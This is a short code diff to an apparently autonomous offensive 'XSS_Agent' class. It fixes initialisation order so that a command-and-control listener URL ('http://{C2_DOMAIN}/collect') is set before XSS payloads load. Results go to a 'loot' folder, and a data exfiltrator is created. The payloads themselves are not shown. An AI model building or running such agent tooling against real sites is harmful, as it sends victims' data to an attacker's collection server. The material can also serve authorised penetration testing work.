@@ -30,11 +30,17 @@ class XSS_Agent(BaseAgent):
 
     def __init__(self, context_manager=None, orchestrator=None, **kwargs):
         super().__init__(context_manager, orchestrator, **kwargs)
-        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "xss")
-        self.payloads = self._load_payloads()
-        self.listener_url = "http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/collect"  # Replace with actual listener
-        os.makedirs(self.results_dir, exist_ok=True)
         workspace_dir = os.getenv("WORKSPACE_DIR", "workspace")
+        self.results_dir = os.path.join(workspace_dir, "loot", "xss")
+        
+        # Set listener_url BEFORE loading payloads (payloads use self.listener_url)
+        c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
+        self.listener_url = f"http://{c2_domain}/collect"
+        
+        # Now load payloads
+        self.payloads = self._load_payloads()
+        
+        os.makedirs(self.results_dir, exist_ok=True)
         self.exfiltrator = DataExfiltrator(workspace_dir=workspace_dir)
 
     def _load_payloads(self) -> Dict[str, List[str]]:
